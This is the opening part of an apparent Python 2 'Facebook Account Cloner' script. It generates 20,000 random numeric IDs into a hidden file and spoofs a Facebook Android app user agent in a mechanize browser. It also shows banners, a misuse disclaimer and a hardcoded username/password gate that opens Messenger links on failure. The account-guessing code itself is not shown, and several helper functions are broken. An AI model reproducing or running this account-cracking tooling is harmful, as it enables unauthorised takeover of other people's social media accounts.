#!/usr/bin/python2
#coding=utf-8
#Biki_Mahamood
#GitHub: biki-cyber404
#Faecbook: m.me/kawsarmisty1257
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(20000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 Biki.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.00005)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mBiki_Mahamood█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\x1b[1;93m    ██████╗░██╗\x1b[1;92m██╗░░██╗██╗
\x1b[1;93m    ██╔══██╗██║\x1b[1;92m██║░██╔╝██║
\x1b[1;93m    ██████╦╝██║\x1b[1;92m█████═╝░██║
\x1b[1;93m    ██╔══██╗██║\x1b[1;92m██╔═██╗░██║
\x1b[1;93m    ██████╦╝██║\x1b[1;92m██║░╚██╗██║
\x1b[1;93m   ╚═════╝░╚═╝\x1b[1;92m╚═╝░░╚═╝╚═╝
    """
print '\x1b[1;96m    Dalkhor Facebook Account Cloner'
print '\x1b[1;97m╔══════════════════════╗'
print'\x1b[1;97m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫   : Biki Mahamood║'
print'\x1b[1;97m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞 : Biki Mahamood║'
print'\x1b[1;97m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: Biki Mahamood║'
print'\x1b[1;97m ║✯𝐆𝐢𝐭𝐇𝐮𝐛   : biki-cyber404║'
print'\x1b[1;97m ║✯𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊║'
time.sleep(0.05)    
print'\x1b[1;97m ╚══════════════════════╝'
time.sleep(0.05)    
print'                                        '
jalan("\x1b[1;92mINPUT USERNAME & PASSWORD")
print 25* '\033[1;96m-'
print'                                        '

CorrectUsername = "BIKI"
CorrectPasscode = "HACKER"

loop = 'true'
while (loop == 'true'):
    username = raw_input("                   \x1b[1;93mINPUT USERNAME \x1b[1;96m: ")
    if (username == CorrectUsername):
            print """
            \033[1;92m        Correct
                  """
            loop = 'false'
    else:
            print "\033[1;91m☠️WRONG"
            os.system('xdg-open https://m.me/Imtiaz.Chowdhury.143')
            
loop = 'true'
while (loop == 'true'):
    passcode = raw_input("                   \x1b[1;93mINPUT PASSWORD \x1b[1;96m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92m        Correct
                  """
                  
            jalan("[𝕳𝕿𝕽] Logging in\x1b[1;93m ●\x1b[1;91m ●\x1b[1;96m ●\x1b[1;95m ●")     
                 
            loop = 'false'
    else:
            print "\033[1;91m☠️WRONG"
            os.system('xdg-open https://m.me/kawsarmisty1257')
            
 

##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print  """
\x1b[1;93m    ██████╗░██╗\x1b[1;92m██╗░░██╗██╗
\x1b[1;93m    ██╔══██╗██║\x1b[1;92m██║░██╔╝██║
\x1b[1;93m    ██████╦╝██║\x1b[1;92m█████═╝░██║
\x1b[1;93m    ██╔══██╗██║\x1b[1;92m██╔═██╗░██║
\x1b[1;93m    ██████╦╝██║\x1b[1;92m██║░╚██╗██║
\x1b[1;93m   ╚═════╝░╚═╝\x1b[1;92m╚═╝░░╚═╝╚═╝
    """
    print '\x1b[1;96m    Pakistani Facebook Account Cloner'
    print '\x1b[1;97m╔══════════════════════╗'
    print'\x1b[1;97m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : Biki Mahamood║'
    print'\x1b[1;97m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: Biki Mahamood║'
    print'\x1b[1;97m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: Biki Mahamood║'
    print'\x1b[1;97m ║✯𝐆𝐢𝐭𝐇𝐮𝐛 : biki-cyber404║'
    print'\x1b[1;97m ║✯𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊║'
    time.sleep(0.05)
